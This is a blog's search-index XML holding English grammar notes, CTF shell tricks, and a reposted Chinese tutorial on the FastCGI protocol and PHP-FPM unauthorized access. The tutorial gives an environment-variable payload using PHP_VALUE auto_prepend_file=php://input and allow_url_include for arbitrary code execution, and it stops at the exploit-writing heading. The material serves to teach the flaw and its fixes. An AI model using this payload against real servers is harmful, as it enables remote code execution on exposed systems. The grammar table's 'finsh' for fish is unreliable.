<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>G002</title>
      <link href="/English/G/G002.html"/>
      <url>/English/G/G002.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>be 动词的数</p></blockquote><span id="more"></span><p>I: am, am not</p><p>He/She/It: is, isn’t</p><p>You/They: are, aren’t</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>G001</title>
      <link href="/English/G/G001.html"/>
      <url>/English/G/G001.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>名词的数</p></blockquote><span id="more"></span><h2 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h2><h3 id="可数"><a href="#可数" class="headerlink" title="可数"></a>可数</h3><ul><li>单数: coats, jobs, hats</li><li>复数<ul><li>规则<ul><li>+s</li><li>(s|x|ch|sh)$: +es</li><li>[^aeiou]y$: sed -r s/y$/ies/</li><li>o<ul><li>(potato|tomato): +es</li><li>(photo|zoo): +s</li></ul></li><li>(f|fe)$: sed -r s/(f|fe)$/ves/</li></ul></li><li>不规则<ul><li>单复同形</li><li>完全不规则</li><li>只有复数</li></ul></li></ul></li></ul><h3 id="不可数"><a href="#不可数" class="headerlink" title="不可数"></a>不可数</h3><p>air, water…</p><h3 id="可数名词复数不规则表"><a href="#可数名词复数不规则表" class="headerlink" title="可数名词复数不规则表"></a>可数名词复数不规则表</h3><p>单复同形</p><table><thead><tr><th align="center">word</th><th align="center">plural</th></tr></thead><tbody><tr><td align="center">finsh</td><td align="center">finsh/finshes</td></tr></tbody></table><blockquote><p>Notes: 同一种类型的鱼使用 finsh</p></blockquote><p>完全不规则</p><table><thead><tr><th align="center">word</th><th align="center">plural</th></tr></thead><tbody><tr><td align="center">man</td><td align="center">men</td></tr><tr><td align="center">child</td><td align="center">children</td></tr><tr><td align="center">foot</td><td align="center">feet</td></tr></tbody></table><p>只有复数</p><table><thead><tr><th>word</th><th>plural</th></tr></thead><tbody><tr><td>people</td><td>people</td></tr><tr><td>police</td><td>police</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>How to learn English?</title>
      <link href="/English/M/How-to-learn-English.html"/>
      <url>/English/M/How-to-learn-English.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>code: 1<br>summary: Note by YaYo, refrence for Morty</p></blockquote><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-----------+   +------+   +---------+   +-----------+</span><br><span class="line">| listening +--&gt;+ talk +--&gt;+ imitate +--&gt;+ translate |</span><br><span class="line">+-----------+   +------+   +---------+   +-----+-----+</span><br><span class="line">^                                              |</span><br><span class="line">|                                              v</span><br><span class="line">|       +--------+     +-----------------------+-----+</span><br><span class="line">+-------+ review |&lt;----+ get new words to dictionary |</span><br><span class="line">        +--------+     +-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>Translate</strong></p><ol><li>Learn by heart</li><li>Read a sentence, translate a sentence</li><li>:star: Sight translation</li></ol><p><strong>Review</strong></p><ol><li>Small amount, many times</li><li>Forgetting curve</li><li>:star: Match the original text</li><li>Don’t write Chinese</li><li>Step learning</li></ol><blockquote><p>Be patient, and all the hard work will eventually pay off.</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctf-linux-cmd.md</title>
      <link href="/TechnicalExperience/Penetration/ctf-linux-cmd.html"/>
      <url>/TechnicalExperience/Penetration/ctf-linux-cmd.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用 linux 系统解题的一些小技巧</p></blockquote><span id="more"></span><ol><li>将文本内容进行 url 编码</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file.txt | xxd -plain | sed -r <span class="string">&#x27;s/(..)/%\1/g&#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>将文本内容进行 url 解码</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;%68%65%6c%6c%6f&#x27;</span> | sed <span class="string">&#x27;s/%//g&#x27;</span> | xxd -r -p</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;%68%65%6c%6c%6f&#x27;</span> | tr -d <span class="string">&#x27;%&#x27;</span> | xxd -r -p</span><br></pre></td></tr></table></figure><ol start="3"><li>bc 进制转换</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;obase=16;ibase=2;11101&quot;</span> | bc</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</title>
      <link href="/TechnicalExperience/Penetration/fastcgi.html"/>
      <url>/TechnicalExperience/Penetration/fastcgi.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载自 <a href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p></blockquote><span id="more"></span><p>搭过php相关环境的同学应该对fastcgi不陌生，那么fastcgi究竟是什么东西，为什么nginx可以通过fastcgi来对接php？</p><h2 id="Fastcgi-Record"><a href="#Fastcgi-Record" class="headerlink" title="Fastcgi Record"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-record">Fastcgi Record</a></h2><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> version; <span class="comment">// 版本</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> type; <span class="comment">// 本次record的类型</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB1; <span class="comment">// 本次record对应的请求id</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB1; <span class="comment">// body体的大小</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingLength; <span class="comment">// 额外块大小</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> reserved; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Body */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> contentData[contentLength];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>头由8个uchar类型的变量组成，每个变量1字节。其中，<code>requestId</code>占两个字节，一个唯一的标志id，以避免多个请求之间的影响；<code>contentLength</code>占两个字节，表示body的大小。</p><p>语言端解析了fastcgi头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p><p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。</p><p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p><h2 id="Fastcgi-Type"><a href="#Fastcgi-Type" class="headerlink" title="Fastcgi Type"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#fastcgi-type">Fastcgi Type</a></h2><p>刚才我介绍了fastcgi一个record中各个结构的含义，其中第二个字节<code>type</code>我没详说。</p><p><code>type</code>就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过<code>type</code>来标志每个record的作用，用<code>requestId</code>作为同一次请求的id。</p><p>也就是说，每次请求，会有多个record，他们的<code>requestId</code>是相同的。</p><p>借用<a href="http://blog.csdn.net/shreck66/article/details/50355729">该文章</a>中的一个表格，列出最主要的几种<code>type</code>：</p><p><img src="https://img-blog.csdnimg.cn/20190828134030833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215c3RlcnlmbG93ZXI=,size_16,color_FFFFFF,t_70" alt="img"></p><p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p><p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameData[nameLength];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB0;  <span class="comment">/* nameLengthB0  &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameData[nameLength];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB0; <span class="comment">/* valueLengthB0 &gt;&gt; 7 == 0 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB3;  <span class="comment">/* nameLengthB3  &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB3; <span class="comment">/* valueLengthB3 &gt;&gt; 7 == 1 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueLengthB0;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> nameData[nameLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> valueData[valueLength</span><br><span class="line">          ((B3 &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">24</span>) + (B2 &lt;&lt; <span class="number">16</span>) + (B1 &lt;&lt; <span class="number">8</span>) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure><p>这其实是4个结构，至于用哪个结构，有如下规则：</p><ol><li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li></ol><p>为什么我只介绍<code>type</code>为4的record？因为环境变量在后面PHP-FPM里有重要作用，之后写代码也会写到这个结构。<code>type</code>的其他情况，大家可以自己翻文档理解理解。</p><h2 id="PHP-FPM（FastCGI进程管理器）"><a href="#PHP-FPM（FastCGI进程管理器）" class="headerlink" title="PHP-FPM（FastCGI进程管理器）"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi">PHP-FPM（FastCGI进程管理器）</a></h2><p>那么，PHP-FPM又是什么东西？</p><p>FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。</p><p>FPM按照fastcgi的协议将TCP流解析成真正的数据。</p><p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/<span class="number">1.0</span>&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=<span class="number">1</span>&amp;b=<span class="number">2</span>&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=<span class="number">1</span>&amp;b=<span class="number">2</span>&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="number">12345</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;<span class="number">80</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/<span class="number">1.1</span>&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p><p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p><h2 id="Nginx（IIS7）解析漏洞"><a href="#Nginx（IIS7）解析漏洞" class="headerlink" title="Nginx（IIS7）解析漏洞"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#nginxiis7">Nginx（IIS7）解析漏洞</a></h2><p>Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境<code>https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability</code>），该漏洞现象是，在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时，访问到的文件是favicon.ico，但却按照.php后缀解析了。</p><p>用户请求<code>http://127.0.0.1/favicon.ico/.php</code>，nginx将会发送如下环境变量到fpm里：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常来说，<code>SCRIPT_FILENAME</code>的值是一个不存在的文件<code>/var/www/html/favicon.ico/.php</code>，是PHP设置中的一个选项<code>fix_pathinfo</code>导致了这个漏洞。PHP为了支持Path Info模式而创造了<code>fix_pathinfo</code>，在这个选项被打开的情况下，fpm会判断<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p><p>所以，第一次fpm发现<code>/var/www/html/favicon.ico/.php</code>不存在，则去掉<code>/.php</code>，再判断<code>/var/www/html/favicon.ico</code>是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p><p>正确的解决方法有两种，一是在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析。</p><h2 id="security-limit-extensions配置"><a href="#security-limit-extensions配置" class="headerlink" title="security.limit_extensions配置"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#securitylimit_extensions"><code>security.limit_extensions</code>配置</a></h2><p>写到这里，PHP-FPM未授权访问漏洞也就呼之欲出了。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p>此时，<code>SCRIPT_FILENAME</code>的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404：</p><p><img src="https://img-blog.csdnimg.cn/2019082813405620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215c3RlcnlmbG93ZXI=,size_16,color_FFFFFF,t_70" alt="img"></p><p>在fpm某个版本之前，我们可以将<code>SCRIPT_FILENAME</code>的值指定为任意后缀文件，比如<code>/etc/passwd</code>；但后来，fpm的默认配置中增加了一个选项<code>security.limit_extensions</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; exectute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions = .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure><p>其限定了只有某些后缀的文件允许被fpm执行，默认是<code>.php</code>。所以，当我们再传入<code>/etc/passwd</code>的时候，将会返回<code>Access denied.</code>：</p><p><img src="https://img-blog.csdnimg.cn/20190828134112328.png" alt="img"></p><blockquote><p>ps. 这个配置也会影响Nginx解析漏洞，我觉得应该是因为Nginx当时那个解析漏洞，促成PHP-FPM增加了这个安全选项。另外，也有少部分发行版安装中<code>security.limit_extensions</code>默认为空，此时就没有任何限制了。</p></blockquote><p>由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p><p>万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用<code>find / -name &quot;*.php&quot;</code>来全局搜索一下默认环境：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/04/25/15695b8e-79ae-4f32-b061-cc5f52236e18.jpg"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vbWVkaWEvYXR0YWNobWVudC8yMDE3LzA0LzI1LzE1Njk1YjhlLTc5YWUtNGYzMi1iMDYxLWNjNWY1MjIzNmUxOC5hNTM2NWQyMDgxOGEuanBn?x-oss-process=image/format,png" alt="14931297810961.jpg"></a></p><p>找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</p><h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#_1">任意代码执行</a></h2><p>那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？</p><p>理论上当然是不可以的，即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p><p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p><p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p><p>那么就有趣了，假设我们设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p><p>那么，我们怎么设置<code>auto_prepend_file</code>的值？</p><p>这又涉及到PHP-FPM的两个环境变量，<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p><p>所以，我们最后传入如下环境变量：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/<span class="number">1.0</span>&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=<span class="number">1</span>&amp;b=<span class="number">2</span>&#x27;,</span><br><span class="line">  &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=<span class="number">1</span>&amp;b=<span class="number">2</span>&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="number">12345</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;<span class="number">80</span>&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/<span class="number">1.1</span>&#x27;</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php:<span class="comment">//input&#x27;,</span></span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p><p>效果如下：</p><p><img src="https://img-blog.csdnimg.cn/20190828134155285.png" alt="img"></p><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a><a 